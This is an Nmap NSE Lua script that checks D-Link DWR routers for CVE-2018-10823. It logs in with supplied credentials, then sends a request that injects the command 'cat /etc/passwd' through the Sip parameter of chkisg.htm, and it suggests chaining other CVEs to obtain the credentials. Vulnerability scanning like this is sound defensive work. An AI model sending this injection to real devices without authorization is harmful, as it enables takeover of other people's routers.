local http = require 'http'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local string = require 'string'
local vulns = require 'vulns'

description = [[
Shell command injection vulnerability on D-Link routers:

- DWR-116 through 1.06,
- DWR-512 through 2.02,
- DWR-712 through 2.02,
- DWR-912 through 2.02,
- DWR-921 through 2.02,
- DWR-111 through 1.01,
- and probably others with the same type of firmware.

An authenticated attacker may execute arbitrary code by injecting the shell command
into the chkisg.htm page Sip parameter. This allows for full control over the device
internals.

Can be combined with CVE-2018-10822 or CVE-2018-10824 in order to discover the username
and password. Then, you can pass the credentials to this script, in order to authenticate
prior to testing the actual vulnerability.

The script attempts a GET HTTP request in order to authenticate and then attempts
a second GET HTTP request to test the vulnerability against a target.

References:
* https://seclists.org/fulldisclosure/2018/Oct/36
* https://sploit.tech/2018/10/12/D-Link.html
]]

---
-- @usage nmap --script http-vuln-cve2018-10823 --script-args "un=admin,pw=thepassword" -p 80,8080 <target>
-- @output
-- PORT   STATE SERVICE REASON
-- 80/tcp open  http    syn-ack
-- | http-vuln-cve2018-10823:
-- |   VULNERABLE:
-- |   D-Link routers shell command injection vulnerability
-- |     State: VULNERABLE
-- |     IDs:  CVE:CVE-2018-10823
-- |     Risk factor: Critical  CVSSv3: 9.1 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)
-- |       Shell command injection vulnerability on D-Link routers.
-- |
-- |     Disclosure date: 2018-10-12
-- |     References:
-- |       https://seclists.org/fulldisclosure/2018/Oct/36
-- |_      https://sploit.tech/2018/10/12/D-Link.html
--
-- @xmloutput
-- <table key='2018-10823'>
-- <elem key='title'>D-Link routers shell command injection vulnerability</elem>
-- <elem key='state'>VULNERABLE</elem>
-- <table key='ids'>
-- <elem>CVE:CVE-2018-10823</elem>
-- </table>
-- <table key='scores'>
-- <elem key='CVSSv3'>9.1 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)</elem>
-- </table>
-- <table key='description'>
-- <elem>Shell command injection vulnerability on D-Link routers.</elem>
-- </table>
-- <table key='dates'>
-- <table key='disclosure'>
-- <elem key='day'>12</elem>
-- <elem key='month'>10</elem>
-- <elem key='year'>2018</elem>
-- </table>
-- </table>
-- <elem key='disclosure'>2018-10-12</elem>
-- <table key='check_results'>
-- </table>
-- <table key='refs'>
-- <elem>https://seclists.org/fulldisclosure/2018/Oct/36</elem>
-- <elem>https://sploit.tech/2018/10/12/D-Link.html</elem>
-- </table>
-- </table>
--
---

author = 'Kostas Milonas'
license = 'Same as Nmap--See https://nmap.org/book/man-legal.html'
categories = {'vuln', 'safe'}

portrule = shortport.http

local function login(host, port, un, pw)
  -- Make a request to the login URL, with the given credentials
  local uri = string.format('/log/in?un=%s&pw=%s&rd=/uir/syslog.htm&rd2=/uir/wanst.htm&Nrd=1', un, pw)
  local response = http.get(host, port, uri, { redirect_ok = true, no_cache = true })

  -- Check if the response contains any message that indicates a failure
  if not http.response_contains(response, 'Login fail') and not http.response_contains(response, 'Password is incorrect.') then
    stdnse.debug1(string.format('Logged in as "%s" with password "%s".', un, pw))
    return true
  end

  return false
end

action = function(host, port)
  local vuln_table = {
    title = 'D-Link routers shell command injection vulnerability',
    IDS = {CVE = 'CVE-2018-10823'},
    risk_factor = 'Critical',
    scores = {
      CVSSv3 = '9.1 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H)',
    },
    description = [[
Shell command injection vulnerability on D-Link routers.
]],
    references = {
      'https://seclists.org/fulldisclosure/2018/Oct/36',
      'https://sploit.tech/2018/10/12/D-Link.html'
    },
    dates = {
      disclosure = {year = '2018', month = '10', day = '12'},
    },
    check_results = {},
    extra_info = {}
  }

  local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
  vuln_table.state = vulns.STATE.NOT_VULN

  -- Get the script arguments, username and password
  local un = stdnse.get_script_args('un')
  local pw = stdnse.get_script_args('pw')

  -- Attempt login  
  local login_success = login(host, port, un, pw)

  -- Login failed
  if not login_success then
    return vuln_report:make_output(vuln_table)
  end

  -- The vulnerable route 
  local uri = '/chkisg.htm%3FSip%3D1.1.1.1%20%7C%20cat%20%2Fetc%2Fpasswd'
  stdnse.debug1('Testing URI: %s', uri)

  -- Test the vulnerability
  local response = http.get(host, port, uri, { redirect_ok = false, no_cache = true })

  if response.status == 200 then
    stdnse.debug1('Vulnerability found!')
    vuln_table.state = vulns.STATE.VULN
  end

  return vuln_report:make_output(vuln_table)
end
